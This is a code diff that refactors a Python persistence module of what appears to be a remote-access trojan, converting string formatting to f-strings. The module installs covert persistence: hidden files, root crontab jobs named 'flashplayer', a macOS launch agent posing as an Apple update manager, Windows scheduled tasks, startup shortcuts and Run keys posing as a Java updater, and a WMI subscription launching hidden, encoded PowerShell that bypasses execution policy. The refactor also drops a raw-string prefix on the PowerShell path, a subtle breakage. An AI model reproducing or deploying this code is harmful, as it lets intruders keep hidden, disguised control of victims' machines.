@@ -82,29 +82,37 @@ class Method():
         self.result = None
         self.established = False
         self.platforms = platforms
-        [util.__logger__.warn("required method '_{}_{}' not found".format(_, self.name)) for _ in ('add','remove') if '_{}_{}'.format(_, self.name) not in globals()]
+        [
+            util.__logger__.warn(f"required method '_{_}_{self.name}' not found")
+            for _ in ('add', 'remove')
+            if f'_{_}_{self.name}' not in globals()
+        ]
 
     def add(self):
         """
         Attempt to establish persistence using the given method
 
         """
-        if sys.platform in self.platforms:
-            if not self.established:
-                self.established, self.result = globals()['_add_{}'.format(self.name)]()
-        else:
-            raise OSError("Persistence method '{}' not compatible with {} platforms".format(self.name, sys.platform))
+        if sys.platform not in self.platforms:
+            raise OSError(
+                f"Persistence method '{self.name}' not compatible with {sys.platform} platforms"
+            )
+
+        if not self.established:
+            self.established, self.result = globals()[f'_add_{self.name}']()
 
     def remove(self):
         """
         Remove an established persistence method from the host machine
 
         """
-        if sys.platform in self.platforms:
-            if self.established:
-                self.established, self.result = globals()['_remove_{}'.format(self.name)]()
-        else:
-            raise OSError("Persistence method '{}' not compatible with {} platforms".format(self.name, sys.platform))
+        if sys.platform not in self.platforms:
+            raise OSError(
+                f"Persistence method '{self.name}' not compatible with {sys.platform} platforms"
+            )
+
+        if self.established:
+            self.established, self.result = globals()[f'_remove_{self.name}']()
 
 def _add_hidden_file(value=None):
     try:
@@ -112,14 +120,14 @@ def _add_hidden_file(value=None):
         if value and os.path.isfile(value):
             if os.name == 'nt':
                 path = value
-                hide = subprocess.call('attrib +h {}'.format(path), shell=True) == 0
+                hide = subprocess.call(f'attrib +h {path}', shell=True) == 0
             else:
                 dirname, basename = os.path.split(value)
-                path = os.path.join(dirname, '.' + basename)
-                hide = subprocess.call('cp {} {}'.format(value, path), shell=True) == 0
-            return (True if hide else False, path)
+                path = os.path.join(dirname, f'.{basename}')
+                hide = subprocess.call(f'cp {value} {path}', shell=True) == 0
+            return hide, path
         else:
-            util.log("File '{}' not found".format(value))
+            util.log(f"File '{value}' not found")
     except Exception as e:
         util.log(e)
     return (False, None)
@@ -131,17 +139,15 @@ def _add_crontab_job(value=None, minutes=10, name='flashplayer'):
             if value and os.path.isfile(value):
                 if not _methods['crontab_job'].established:
                     path = value
-                    task = "0 * * * * root {}".format(path)
+                    task = f"0 * * * * root {path}"
                     with open('/etc/crontab', 'r') as fp:
                         data = fp.read()
                     if task not in data:
                         with open('/etc/crontab', 'a') as fd:
-                            fd.write('\n{}\n'.format(task))
-                    return (True, path)
-                else:
-                    return (True, path)
+                            fd.write(f'\n{task}\n')
+                return (True, path)
     except Exception as e:
-        util.log("{} error: {}".format(_add_crontab_job.__name__, str(e)))
+        util.log(f"{_add_crontab_job.__name__} error: {str(e)}")
     return (False, None)
 
 def _add_launch_agent(value=None, name='com.apple.update.manager'):
@@ -159,20 +165,35 @@ def _add_launch_agent(value=None, name='com.apple.update.manager'):
                 label = name
                 if not os.path.exists('/var/tmp'):
                     os.makedirs('/var/tmp')
-                fpath = '/var/tmp/.{}.sh'.format(name)
+                fpath = f'/var/tmp/.{name}.sh'
                 bash = template_plist.substitute(LABEL=label, FILE=value)
                 with open(fpath, 'w') as fileobj:
                     fileobj.write(bash)
-                bin_sh = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                bin_sh = bytes().join(
+                    subprocess.Popen(
+                        f'/bin/sh {fpath}',
+                        0,
+                        None,
+                        None,
+                        subprocess.PIPE,
+                        subprocess.PIPE,
+                        shell=True,
+                    ).communicate()
+                )
+
                 time.sleep(1)
-                launch_agent= os.path.join(os.environ.get('HOME'), 'Library/LaunchAgents/{}.plist'.format(label))
+                launch_agent = os.path.join(
+                    os.environ.get('HOME'),
+                    f'Library/LaunchAgents/{label}.plist',
+                )
+
                 if os.path.isfile(launch_agent):
                     os.remove(fpath)
                     return (True, launch_agent)
                 else:
-                    util.log('File {} not found'.format(launch_agent))
+                    util.log(f'File {launch_agent} not found')
     except Exception as e2:
-        util.log('Error: {}'.format(str(e2)))
+        util.log(f'Error: {str(e2)}')
     return (False, None)
 
 def _add_scheduled_task(value=None, name='Java-Update-Manager'):
@@ -181,11 +202,15 @@ def _add_scheduled_task(value=None, name='Java-Update-Manager'):
             value = sys.argv[0]
             name  = util.variable(random.randint(6,11))
             if value and os.path.isfile(value):
-                result  = subprocess.check_output('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(name, value), shell=True)
+                result = subprocess.check_output(
+                    f'SCHTASKS /CREATE /TN {name} /TR {value} /SC hourly /F',
+                    shell=True,
+                )
+
                 if 'SUCCESS' in result:
                     return (True, result.replace('"', ''))
     except Exception as e:
-        util.log('Add scheduled task error: {}'.format(str(e)))
+        util.log(f'Add scheduled task error: {str(e)}')
     return (False, None)
 
 def _add_startup_file(value=None, name='Java-Update-Manager'):
@@ -197,14 +222,14 @@ def _add_startup_file(value=None, name='Java-Update-Manager'):
                 startup_dir = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
                 if not os.path.exists(startup_dir):
                     os.makedirs(startup_dir)
-                startup_file = os.path.join(startup_dir, '%s.eu.url' % name)
+                startup_file = os.path.join(startup_dir, f'{name}.eu.url')
                 content = '\n[InternetShortcut]\nURL=file:///%s\n' % value
                 if not os.path.exists(startup_file) or content != open(startup_file, 'r').read():
                     with open(startup_file, 'w') as fp:
                         fp.write(content)
                 return (True, startup_file)
     except Exception as e:
-        util.log('{} error: {}'.format(_add_startup_file.__name__, str(e)))
+        util.log(f'{_add_startup_file.__name__} error: {str(e)}')
     return (False, None)
 
 def _add_registry_key(value=None, name='Java-Update-Manager'):
@@ -216,33 +241,40 @@ def _add_registry_key(value=None, name='Java-Update-Manager'):
                     util.registry_key(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", name, value)
                     return (True, name)
                 except Exception as e:
-                    util.log('{} error: {}'.format(_add_registry_key.__name__, str(e)))
+                    util.log(f'{_add_registry_key.__name__} error: {str(e)}')
     except Exception as e:
-        util.log('{} error: {}'.format(_add_registry_key.__name__, str(e)))
+        util.log(f'{_add_registry_key.__name__} error: {str(e)}')
     return (False, None)
 
 def _add_powershell_wmi(command=None, name='Java-Update-Manager'):
     try:
         global template_wmi
-        if os.name == 'nt' and not _methods['powershell_wmi'].established:
-            if command:
-                cmd_line = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(bytes(command).encode('UTF-16LE')))
-                startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
-                script = template_wmi.substitute(STARTUP=startup, COMMAND_LINE=cmd_line, NAME=name)
-                _ = util.powershell(script)
-                code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
-                result = util.powershell(code)
-                if name in result:
-                    return (True, result)
+        if (
+            os.name == 'nt'
+            and not _methods['powershell_wmi'].established
+            and command
+        ):
+            cmd_line = f"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -window hidden -noni -nop -encoded {base64.b64encode(bytes(command).encode('UTF-16LE'))}"
+
+            startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
+            script = template_wmi.substitute(STARTUP=startup, COMMAND_LINE=cmd_line, NAME=name)
+            _ = util.powershell(script)
+            code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
+            result = util.powershell(code)
+            if name in result:
+                return (True, result)
     except Exception as e:
-        util.log('{} error: {}'.format(_add_powershell_wmi.__name__, str(e)))
+        util.log(f'{_add_powershell_wmi.__name__} error: {str(e)}')
     return (False, None)
 
 def _remove_scheduled_task():
     if _methods['scheduled_task'].established:
         value = _methods['scheduled_task'].result
         try:
-            if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(value), shell=True) == 0:
+            if (
+                subprocess.call(f'SCHTASKS /DELETE /TN {value} /F', shell=True)
+                == 0
+            ):
                 return (False, None)
         except:
             pass
@@ -254,13 +286,18 @@ def _remove_hidden_file():
             filename = _methods['hidden_file'].result
             if os.path.isfile(filename):
                 try:
-                    unhide  = 'attrib -h {}'.format(filename) if os.name == 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
+                    unhide = (
+                        f'attrib -h {filename}'
+                        if os.name == 'nt'
+                        else f"mv {filename} {os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.'))}"
+                    )
+
                     if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                         return (False, None)
                 except Exception as e1:
-                    util.log('{} error: {}'.format(_remove_hidden_file.__name__, str(e1)))
+                    util.log(f'{_remove_hidden_file.__name__} error: {str(e1)}')
     except Exception as e2:
-        util.log('{} error: {}'.format(_remove_hidden_file.__name__, str(e2)))
+        util.log(f'{_remove_hidden_file.__name__} error: {str(e2)}')
     return (_methods['hidden_file'].established, _methods['hidden_file'].result)
 
 def _remove_crontab_job(value=None, name='flashplayer'):
@@ -275,7 +312,7 @@ def _remove_crontab_job(value=None, name='flashplayer'):
                 fp.write('\n'.join(lines))
         return (False, None)
     except Exception as e:
-        util.log('{} error: {}'.format(_remove_crontab_job.__name__, str(e)))
+        util.log(f'{_remove_crontab_job.__name__} error: {str(e)}')
     return (_methods['hidden_file'].established, _methods['hidden_file'].result)
 
 def _remove_launch_agent(value=None, name='com.apple.update.manager'):
@@ -286,7 +323,7 @@ def _remove_launch_agent(value=None, name='com.apple.update.manager'):
                 util.delete(launch_agent)
                 return (False, None)
     except Exception as e:
-        util.log("{} error: {}".format(_remove_launch_agent.__name__, str(e)))
+        util.log(f"{_remove_launch_agent.__name__} error: {str(e)}")
     return (_methods['launch_agent'].established, _methods['launch_agent'].result)
 
 def _remove_powershell_wmi(value=None, name='Java-Update-Manager'):
@@ -303,7 +340,7 @@ def _remove_powershell_wmi(value=None, name='Java-Update-Manager'):
             except: pass
         return (_methods['powershell_wmi'].established, _methods['powershell_wmi'].result)
     except Exception as e:
-        util.log('{} error: {}'.format(_add_powershell_wmi.__name__, str(e)))
+        util.log(f'{_add_powershell_wmi.__name__} error: {str(e)}')
     return (_methods['powershell_wmi'].established, _methods['powershell_wmi'].result)
 
 def _remove_registry_key(value=None, name='Java-Update-Manager'):
@@ -329,12 +366,12 @@ def _remove_startup_file():
                     return (False, None)
                 appdata      = os.path.expandvars("%AppData%")
                 startup_dir  = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
-                startup_file = os.path.join(startup_dir, value) + '.eu.url'
+                startup_file = f'{os.path.join(startup_dir, value)}.eu.url'
                 if os.path.exists(startup_file):
                     util.delete(startup_file)
         return (False, None)
     except Exception as e:
-        util.log('{} error: {}'.format(_remove_startup_file.__name__, str(e)))
+        util.log(f'{_remove_startup_file.__name__} error: {str(e)}')
 
 hidden_file = Method('hidden_file', platforms=['win32','linux','linux2','darwin'])
 crontab_job = Method('crontab_job', platforms=['linux','linux2'])
